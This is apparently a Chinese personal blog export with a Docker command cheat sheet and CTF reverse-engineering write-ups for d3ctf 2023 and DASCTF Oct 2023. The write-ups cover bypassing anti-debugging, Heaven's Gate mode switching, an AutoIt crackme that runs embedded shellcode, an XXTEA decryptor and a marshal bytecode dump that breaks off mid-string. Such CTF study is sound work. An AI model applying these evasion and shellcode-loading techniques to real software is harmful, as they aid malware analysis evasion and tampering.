<p>构建 docker 镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose build</span><br></pre></td></tr></table></figure>
<p>启动 docker 至后台：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>
<p>进入 docker 进行交互：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it compiler /bin/bash</span><br></pre></td></tr></table></figure>
<p>以命令行模式进入 docker：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -it ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>退出 docker：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit</span><br></pre></td></tr></table></figure>
<p>停止与删除容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
<p>查看所有 docker：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>
<p>启动已经停止的 docker：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure>
<p>指定 docker 运行模式（-d 不进入 docker）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -itd --name ubuntu-test ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>sleep 休眠状态，保持容器运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d python313 sleep infinity</span><br></pre></td></tr></table></figure>
<p>停止容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker stop &lt;容器 ID&gt;</span><br></pre></td></tr></table></figure>
<p>进入正在后台的容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach</span><br></pre></td></tr></table></figure>
<p>退出容器终端但不停止：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec</span><br></pre></td></tr></table></figure>
<p>重新进入容器交互界面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker exec -it &lt;容器 ID&gt; /bin/bash</span><br></pre></td></tr></table></figure>
<p>导出容器快照：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker export 1e560fca3906 &gt; ubuntu.tar</span><br></pre></td></tr></table></figure>
<p>重将容器快照导入为镜像：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat docker/ubuntu.tar | docker import - test/ubuntu:v1</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker import http://example.com/exampleimage.tgz example/imagerepo</span><br></pre></td></tr></table></figure>
<p>删除容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker rm -f 1e560fca3906</span><br></pre></td></tr></table></figure>
<p>传入文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp file &lt;容器 ID&gt;:/app/file</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>d3ctf 2023</title>
    <url>/2023/07/11/d3ctf-2023/</url>
    <content><![CDATA[<h6 id="好久没写blog了qaq受到某人启发觉得有空还是写写多少动动笔吧-本来是打算先写安卓学习的那篇想着找个题复现吧回来看看d3那个写不明白的android结果一看d3好几个题读作solved写作看一眼毫无印象遂决定回来重新做一次"><a class="markdownIt-Anchor" href="#好久没写blog了qaq受到某人启发觉得有空还是写写多少动动笔吧-本来是打算先写安卓学习的那篇想着找个题复现吧回来看看d3那个写不明白的android结果一看d3好几个题读作solved写作看一眼毫无印象遂决定回来重新做一次">#</a> 好久没写 blog 了 QAQ，受到某人启发觉得有空还是写写，多少动动笔吧。本来是打算先写安卓学习的那篇，想着找个题复现吧，回来看看 d3 那个写不明白的 android，<s>结果一看 d3 好几个题读作 solved，写作看一眼毫无印象</s>，遂决定回来重新做一次</h6>
<span id="more"></span>
<h2 id="d3hell_attachment"><a class="markdownIt-Anchor" href="#d3hell_attachment">#</a> d3hell_attachment</h2>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711190621273.png" alt="image-20230711190621273"></p>
<p>首先这里的 d3runtime.dll 就够可疑的了，调起来就有点印象。先在 main 开头断下来，果不其然 modules 里面的 d3runtime.dll 里面的东西很可疑</p>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711191017764.png" alt="image-20230711191017764"></p>
<p>之前自己弄过一点 dll 加载相关的出题（后面有空写个 blog 记录一下，<s>希望不鸽，虽然已经鸽了半年</s>）这个位置直接调有时候窗口不会自己跳转过来，这里函数不多，直接往每个函数开头下断点</p>
<p>main 里面的 sleep 常规 nop 掉，下面的逻辑看着是在骗人，真正的逻辑在 dll 里</p>
<p>胆大的直接 F9，出锅了，调了调发现卡在 sub_40216A，重来</p>
<p>压根没进 main，tls_callback 就把 dll 起起来了（第一遍动态的时候在 dll 下了断点，第二遍就直接发现了）</p>
<p>直接进了 <code>d3runtime__61FC1628</code>  看不出来啥用，有点像花但不能 nop 的</p>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711192346716.png" alt="image-20230711192346716"></p>
<p>感觉是故意的… 编译器会这么优化么… 不能删这里，逻辑是中间的 mov 和 add 走两次，下面有个一样的操作</p>
<p>谁教的…</p>
<p>不能 F5，单步往下</p>
<p>而后 <code>d3runtime__61FC1578</code>  函数，TEA 加密，但是不知道啥用，接着调</p>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711192920527.png" alt="image-20230711192920527"></p>
<p>这里上了反调，直接过掉，但是后面的代码很奇怪，明显反编译有问题，重调</p>
<p>注意到一个很奇怪的事情，这里：</p>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711194724759.png" alt="image-20230711194724759"></p>
<p>合理的话按照上面相同的写法，应该是 <code>E8 00 00 00 00</code> ，但是这里少了一个 00，一开始以为可以不需要，但是想想不对。这里怎么想都应该是 <code>call $5</code>  的操作，然后后面可以还原出上面的逻辑</p>
<p>哦，动动脑子，这里换 32-bit 了，天堂之门，对应题目 hell</p>
<p>这里确实萌新没接触过天堂之门的，没从 <code>tls</code>  和 <code>DllMainCRTStartup</code>  里看出什么端倪，但是总归这里是 32bit，那 dump 下来放进 ida 里看看，呜哇，修了半个小时修不明白</p>
<p>那也可以硬调吧，不妨碍，既然他能运行那姑且也可以调</p>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711200137667.png" alt="image-20230711200137667"></p>
<p>调 dll 的确实…<s> 不知道谁也出过类似的恶心题目</s></p>
<p>但是主逻辑有了的，下面 <code>isdebuggerpresent</code>  给他拿掉，这里主要是 V0 没有识别出来，跳转的时候没有找到 jmp 的位置，否则不会有那么多逃逸变量…</p>
<p>勉强可以辨认这里修改的表</p>
<p>回到 main 里，实际操作也就这里面：</p>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711200826897.png" alt="image-20230711200826897"></p>
<p><code>byte_405060</code>  刚才在 dll 已经走过了，差这个 flag 表，应当在这里走走：</p>
<p><img loading="lazy" data-src="d3ctf-2023/image-20230711201100046.png" alt="image-20230711201100046"></p>
<p>再往前推么发现跟 v12 有关，于是牵扯到了 <code>sub_40216A</code> ，这里确实确实看不懂了，即使出题人好心没去结构体的符号表…</p>
<p>先说结论，这里是大整数分解。其次，看的别人的 wp 知道的</p>
<p>结论是这里把换后的表带入大整数分解，得到的两段拼接起来是 flag…</p>
<h6 id="合着练了一下动调实话说目前算是做不出来这个题的"><a class="markdownIt-Anchor" href="#合着练了一下动调实话说目前算是做不出来这个题的">#</a> 合着练了一下动调… 实话说目前算是做不出来这个题的…</h6>
<h6 id="嗯天堂之门有空来写一个试试参考原创天堂之门-heavens-gate-c语言实现-软件逆向-看雪-安全社区安全招聘kanxuecom"><a class="markdownIt-Anchor" href="#嗯天堂之门有空来写一个试试参考原创天堂之门-heavens-gate-c语言实现-软件逆向-看雪-安全社区安全招聘kanxuecom">#</a> 嗯，天堂之门有空来写一个试试…[参考]([<a href="https://bbs.kanxue.com/thread-270153.htm">原创] 天堂之门 (Heaven’s Gate) C 语言实现 - 软件逆向 - 看雪 - 安全社区 | 安全招聘 | kanxue.com</a>)</h6>
<h6 id="结论有经验的话就不算难题但是初见还挺可怕的"><a class="markdownIt-Anchor" href="#结论有经验的话就不算难题但是初见还挺可怕的">#</a> 结论，有经验的话就不算难题，但是初见还挺可怕的</h6>
<h2 id><a class="markdownIt-Anchor" href="#">#</a> </h2>
]]></content>
  </entry>
  <entry>
    <title>das202310</title>
    <url>/2023/10/25/das202310/</url>
    <content><![CDATA[<h6 id="prefaceyysy没咋认真在做同时的n1ctf有点难了加上早上起来心态有点差"><a class="markdownIt-Anchor" href="#prefaceyysy没咋认真在做同时的n1ctf有点难了加上早上起来心态有点差">#</a> PREFACE：yysy 没咋认真在做，同时的 n1ctf 有点难了，加上早上起来心态有点差</h6>
<span id="more"></span>
<h3 id="auuuu3"><a class="markdownIt-Anchor" href="#auuuu3">#</a> auuuu3</h3>
<p>autoit3 编译的，需要专门反编译出来会比较好</p>
<p>这里用的 AutoEye，效果挺好的，找到核心逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">Func enc($data, $key)</span><br><span class="line">$data = Binary($data)</span><br><span class="line">Local $datalen = BinaryLen($data)</span><br><span class="line">If $datalen = 0 Then</span><br><span class="line">Return &#x27;&#x27;</span><br><span class="line">ElseIf $datalen &lt; 8 Then</span><br><span class="line">$datalen = 8</span><br><span class="line">EndIf</span><br><span class="line">Local $opcode = &quot;0xquot;</span><br><span class="line">Local $codebuffer = DllStructCreate(&quot;byte[&quot; &amp; BinaryLen($opcode) &amp; &quot;]&quot;)</span><br><span class="line">DllStructSetData($codebuffer, 1, $opcode)</span><br><span class="line">Local $v = DllStructCreate(&quot;byte[&quot; &amp; Ceiling($datalen / 4) * 4 &amp; &quot;]&quot;)</span><br><span class="line">DllStructSetData($v, 1, $data)</span><br><span class="line">Local $k = DllStructCreate(&quot;byte[16]&quot;)</span><br><span class="line">DllStructSetData($k, 1, $key)</span><br><span class="line">DllCall(&quot;user32.dll&quot;, &quot;none&quot;, &quot;CallWindowProc&quot;, &quot;ptr&quot;, DllStructGetPtr($codebuffer), &quot;ptr&quot;, DllStructGetPtr($v), &quot;int&quot;, Ceiling($datalen / 4), &quot;ptr&quot;, DllStructGetPtr($k), &quot;int&quot;, 0)</span><br><span class="line">Local $ret = DllStructGetData($v, 1)</span><br><span class="line">$codebuffer = 0</span><br><span class="line">$v = 0</span><br><span class="line">$k = 0</span><br><span class="line">Return $ret</span><br><span class="line">EndFunc</span><br><span class="line"></span><br><span class="line">$form1 = GUICreate(&quot;auuuu3&quot;, 378, 185, 254, 182)</span><br><span class="line">GUICtrlSetFont(-1, 14, 400, 0, &quot;MS Sans Serif&quot;)</span><br><span class="line">$serial = GUICtrlCreateInput(&#x27;&#x27;, 56, 48, 257, 21)</span><br><span class="line">$check = GUICtrlCreateButton(&quot;Check&quot;, 56, 80, 257, 33)</span><br><span class="line">GUISetState(@SW_SHOW)</span><br><span class="line">While 1</span><br><span class="line">$nmsg = GUIGetMsg()</span><br><span class="line">Switch $nmsg</span><br><span class="line">Case $GUI_EVENT_CLOSE</span><br><span class="line">Exit</span><br><span class="line">Case $check</span><br><span class="line">Dim $ciphertext = &quot;0x7218181A02F79F4B5773E8FFE83FE732DF96259FF2B86AAB945468A132A83D83CF9D750E316C8675&quot;</span><br><span class="line">$key = &quot;Wowww111auUu3&quot;</span><br><span class="line">$str = GUICtrlRead($serial)</span><br><span class="line">If StringLen($str) &lt;&gt; 38 Then</span><br><span class="line">MsgBox(&#x27;&#x27;, &#x27;&#x27;, &quot;wrong&quot;)</span><br><span class="line">ContinueCase</span><br><span class="line">EndIf</span><br><span class="line">$encrypt = enc($str, $key)</span><br><span class="line">If $encrypt == $ciphertext Then</span><br><span class="line">MsgBox(&#x27;&#x27;, &#x27;&#x27;, &quot;correct&quot;)</span><br><span class="line">ContinueCase</span><br><span class="line">EndIf</span><br><span class="line">MsgBox(&#x27;&#x27;, &#x27;&#x27;, &quot;wrong&quot;)</span><br><span class="line">EndSwitch</span><br><span class="line">WEnd</span><br></pre></td></tr></table></figure>
<p>这里 key 和 enc 都有了，opcode 一眼看上去就是 shellcode（对齐的 0 太多了）</p>
<p>提取，发现是 xxtea</p>
<p><img loading="lazy" data-src="das202310/image-20231025103224793.png" alt="image-20231025103224793"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MX</span>(<span class="params">z, y, total, key, p, e</span>):</span><br><span class="line">    temp1 = (z.value &gt;&gt; <span class="number">5</span> ^ y.value &lt;&lt; <span class="number">2</span>) + (y.value &gt;&gt; <span class="number">3</span> ^ z.value &lt;&lt; <span class="number">4</span>)</span><br><span class="line">    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="number">3</span>) ^ e.value] ^ z.value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> c_uint32(temp1 ^ temp2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">n, v, key</span>):</span><br><span class="line">    delta = -<span class="number">1640531527</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line"></span><br><span class="line">    total = c_uint32(<span class="number">0</span>)</span><br><span class="line">    z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        total.value += delta</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            y = c_uint32(v[p + <span class="number">1</span>])</span><br><span class="line">            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value</span><br><span class="line">            z.value = v[p]</span><br><span class="line">        y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">        v[n - <span class="number">1</span>] = c_uint32(v[n - <span class="number">1</span>] + MX(z, y, total, key, n - <span class="number">1</span>, e).value).value</span><br><span class="line">        z.value = v[n - <span class="number">1</span>]</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">n, v, key</span>):</span><br><span class="line">    delta = -<span class="number">1640531527</span></span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line"></span><br><span class="line">    total = c_uint32(rounds * delta)</span><br><span class="line">    y = c_uint32(v[<span class="number">0</span>])</span><br><span class="line">    e = c_uint32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> rounds &gt; <span class="number">0</span>:</span><br><span class="line">        e.value = (total.value &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = c_uint32(v[p - <span class="number">1</span>])</span><br><span class="line">            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value</span><br><span class="line">            y.value = v[p]</span><br><span class="line">        z = c_uint32(v[n - <span class="number">1</span>])</span><br><span class="line">        v[<span class="number">0</span>] = c_uint32(v[<span class="number">0</span>] - MX(z, y, total, key, <span class="number">0</span>, e).value).value</span><br><span class="line">        y.value = v[<span class="number">0</span>]</span><br><span class="line">        total.value -= delta</span><br><span class="line">        rounds -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    v = [<span class="number">0x1A181872</span>, <span class="number">0x4B9FF702</span>, <span class="number">0xFFE87357</span>, <span class="number">0x32E73FE8</span>, <span class="number">0x9F2596DF</span>, <span class="number">0xAB6AB8F2</span>, <span class="number">0xA1685494</span>, <span class="number">0x833DA832</span>, <span class="number">0x0E759DCF</span>, <span class="number">0x75866C31</span>]</span><br><span class="line">    key = <span class="string">&quot;Wowww111auUu3&quot;</span></span><br><span class="line">    key_bytes = key.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    k = [<span class="built_in">int</span>.from_bytes(key_bytes[i * <span class="number">4</span>:i * <span class="number">4</span> + <span class="number">4</span>], <span class="string">&#x27;little&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>)]</span><br><span class="line">    n = <span class="number">10</span></span><br><span class="line">    res = decrypt(n, v, k)</span><br><span class="line">    a = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        packed = struct.pack(<span class="string">&#x27;&lt;I&#x27;</span>, res[i])</span><br><span class="line">        flag = struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>, packed)</span><br><span class="line">        a += <span class="built_in">hex</span>(flag[<span class="number">0</span>])[<span class="number">2</span>:]</span><br><span class="line">    a = [<span class="built_in">chr</span>(<span class="built_in">int</span>(a[i:i+<span class="number">2</span>], <span class="number">16</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(a), <span class="number">2</span>)]</span><br><span class="line">    a = <span class="string">&#x27;&#x27;</span>.join(a)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure>
<h3 id="marshal"><a class="markdownIt-Anchor" href="#marshal">#</a> marshal</h3>
<p>一开始以为和上次 <code>Seccon 2023</code>  的 <code>Sickle</code>  一样需要自己改源码 print</p>
<p>结果只是一个 marshal 套娃…</p>
<p>这下不仅想多，还坑了队友…</p>
<p>提取字节码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"></span><br><span class="line">code = [<span class="string">b&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)]</span><br><span class="line"></span><br><span class="line">code[<span class="number">0</span>] = <span class="string">b&#x27;c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00@\x00\x00\x00s\xe2\x00\x00\x00d\x00d\x01d\x02d\x03d\x04d\x05d\x06d\x07d\x08d\td\nd\x0bd\x0cd\rd\x0ed\x0fg\x10Z\x00d\x10d\x11\x84\x00e\x01d\x12\x83\x01D\x00\x83\x01Z\x02d\x05d\x12d\x13d\x14d\x0ed\x15d\x16d\x17d\x0fd\x18d\x19d\x1ad\x08d\x1bd\x1cd\x1dd\x0cd\x1ed\x1fd d\x01d!d&quot;d#d\x02d$d%d&amp;d\rd\&#x27;d(d)d\x0bd*d+d,d\x04d-d.d/d\x06d0d1d2d\x03d3d4d5d\x00d6d7d8d\x07d9d:d;d\td&lt;d=d&gt;d\nd?d@dAg@Z\x03dBd\x11\x84\x00e\x01dC\x83\x01D\x00\x83\x01Z\x04e\x05\xa0\x06dD\xa1\x01Z\x07e\x08e\x07\x83\x01\x01\x00dES\x00)F\xe9\x0c\x00\x00\x00\xe9\x05\x00\x00\x00\xe9\x06\x00\x00\x00\xe9\x0b\x00\x00\x00\xe9\t\x00\x00\x00\xe9\x00\x00\x00\x00\xe9\n\x00\x00\x00\xe9\r\x00\x00\x00\xe9\x03\x00\x00\x00\xe9\x0e\x00\x00\x00\xe9\x0f\x00\x00\x00\xe9\x08\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x07\x00\x00\x00\xe9\x01\x00\x00\x00\xe9\x02\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00\xa9\x00)\x02\xda\x04Sbox\xda\x05index\xa9\x02\xda\x02.0\xda\x01xr\x10\x00\x00\x00r\x10\x00\x00\x00\xda\x00\xda\n&lt;listcomp&gt;\x04\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00r\x17\x00\x00\x00\xe9\x10\x00\x00\x00\xe9 \x00\x00\x00\xe90\x00\x00\x00\xe9\x11\x00\x00\x00\xe9!\x00\x00\x00\xe91\x00\x00\x00\xe9\x12\x00\x00\x00\xe9&quot;\x00\x00\x00\xe92\x00\x00\x00\xe9\x13\x00\x00\x00\xe9#\x00\x00\x00\xe93\x00\x00\x00\xe9\x14\x00\x00\x00\xe9$\x00\x00\x00\xe94\x00\x00\x00\xe9\x15\x00\x00\x00\xe9%\x00\x00\x00\xe95\x00\x00\x00\xe9\x16\x00\x00\x00\xe9&amp;\x00\x00\x00\xe96\x00\x00\x00\xe9\x17\x00\x00\x00\xe9\&#x27;\x00\x00\x00\xe97\x00\x00\x00\xe9\x18\x00\x00\x00\xe9(\x00\x00\x00\xe98\x00\x00\x00\xe9\x19\x00\x00\x00\xe9)\x00\x00\x00\xe99\x00\x00\x00\xe9\x1a\x00\x00\x00\xe9*\x00\x00\x00\xe9:\x00\x00\x00\xe9\x1b\x00\x00\x00\xe9+\x00\x00\x00\xe9;\x00\x00\x00\xe9\x1c\x00\x00\x00\xe9,\x00\x00\x00\xe9&lt;\x00\x00\x00\xe9\x1d\x00\x00\x00\xe9-\x00\x00\x00\xe9=\x00\x00\x00\xe9\x1e\x00\x00\x00\xe9.\x00\x00\x00\xe9&gt;\x00\x00\x00\xe9\x1f\x00\x00\x00\xe9/\x00\x00\x00\xe9?\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s\x16\x00\x00\x00g\x00|\x00]\x0e&#125;\x01t\x00\xa0\x01|\x01\xa1\x01\x91\x02q\x04S\x00r\x10\x00\x00\x00)\x02\xda\x04PBoxr\x12\x00\x00\x00r\x13\x00\x00\x00r\x10\x00\x00\x00r\x10\x00\x00\x00r\x16\x00\x00\x00r\x17\x00\x00\x00\t\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00\xe9@\x00\x00\x00s#\n\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00C\x00\x00\x00s\x08\x00\x00\x00|\x00|\x01A\x00S\x00)\x01N\xa9\x00)\x02\xda\x05stateZ\x08roundkeyr\x00\x00\x00\x00r\x00\x00\x00\x00\xda\x00\xda\x0baddRoundKey\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x03\x00\x00\x00s,\t\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x06\x00\x00\x00C\x00\x00\x00s6\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]$&#125;\x02|\x01t\x01|\x00|\x02d\x03\x14\x00?\x00d\x04@\x00\x19\x00|\x02d\x03\x14\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x05N\xe9\x00\x00\x00\x00\xe9\x10\x00\x00\x00\xe9\x04\x00\x00\x00\xe9\x0f\x00\x00\x00)\x02\xda\x05rangeZ\x04Sbox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x08\x00\x00\x00\xda\x00\xda\tsBoxLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01&quot;\x01r\n\x00\x00\x00s\xe4\x07\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00s.\x00\x00\x00d\x01&#125;\x01t\x00d\x02\x83\x01D\x00]\x1c&#125;\x02|\x01|\x00|\x02?\x00d\x03@\x00t\x01|\x02\x19\x00&gt;\x007\x00&#125;\x01q\x0c|\x01S\x00)\x04N\xe9\x00\x00\x00\x00\xe9@\x00\x00\x00\xe9\x01\x00\x00\x00)\x02\xda\x05rangeZ\x04PBox)\x03\xda\x05state\xda\x06output\xda\x01i\xa9\x00r\x07\x00\x00\x00\xda\x00\xda\x06pLayer\x02\x00\x00\x00s\x08\x00\x00\x00\x00\x01\x04\x01\x0c\x01\x1a\x01r\t\x00\x00\x00s\xac\x06\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x04\x00\x00\x00\x03\x00\x00\x00s\x1a\x00\x00\x00t\x00\x87\x00f\x01d\x01d\x02\x84\x08t\x01d\x03\x83\x01D\x00\x83\x01\x83\x01S\x00)\x04Nc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05\x00\x00\x00\x13\x00\x00\x00s \x00\x00\x00g\x00|\x00]\x18&#125;\x01t\x00\x88\x00|\x01\x19\x00\x83\x01d\x00|\x01\x14\x00&gt;\x00\x91\x02q\x04S\x00)\x01\xe9\x08\x00\x00\x00)\x01\xda\x03ord)\x02\xda\x02.0\xda\x01c\xa9\x01\xda\x01i\xa9\x00\xda\x00\xda\n&lt;listcomp&gt;\x03\x00\x00\x00s\x04\x00\x00\x00\x06\x00\x02\x00z!string2number.&lt;locals&gt;.&lt;listcomp&gt;r\x00\x00\x00\x00)\x02\xda\x03sum\xda\x05ranger\x04\x00\x00\x00r\x06\x00\x00\x00r\x04\x00\x00\x00r\x07\x00\x00\x00\xda\rstring2number\x02\x00\x00\x00s\x02\x00\x00\x00\x00\x01r\x0b\x00\x00\x00s\x01\x05\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00s\x1e\x00\x00\x00d\x00d\x01\x84\x00Z\x00e\x01\xa0\x02d\x02\xa1\x01Z\x03e\x04e\x03\x83\x01\x01\x00d\x03S\x00)\x04c\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00C\x00\x00\x00st\x00\x00\x00g\x00&#125;\x02t\x00d\x01|\x01d\x01\x17\x00d\x01\x83\x03D\x00]Z&#125;\x03|\x02\xa0\x01|\x00d\x02?\x00\xa1\x01\x01\x00|\x00d\x03@\x00d\x04&gt;\x00|\x00d\x05?\x00\x17\x00&#125;\x00t\x02|\x00d\x06?\x00\x19\x00d\x06&gt;\x00|\x00d\x07d\x06\x13\x00d\x01\x18\x00@\x00\x17\x00&#125;\x00|\x00|\x03d\x08&gt;\x00|\x00d\x05?\x00A\x00N\x00&#125;\x00q\x14|\x02S\x00)\tN\xe9\x01\x00\x00\x00\xe9\x10\x00\x00\x00i\xff\xff\x07\x00\xe9=\x00\x00\x00\xe9\x13\x00\x00\x00\xe9L\x00\x00\x00\xe9\x02\x00\x00\x00\xe9\x0f\x00\x00\x00)\x03\xda\x05range\xda\x06appendZ\x04Sbox)\x04\xda\x03key\xda\x06roundsZ\troundkeys\xda\x01i\xa9\x00r\x0c\x00\x00\x00\xda\x00\xda\x13generateRoundkeys80\x02\x00\x00\x00s\x0e\x00\x00\x00\x00\x01\x04\x01\x14\x01\x0e\x01\x14\x01 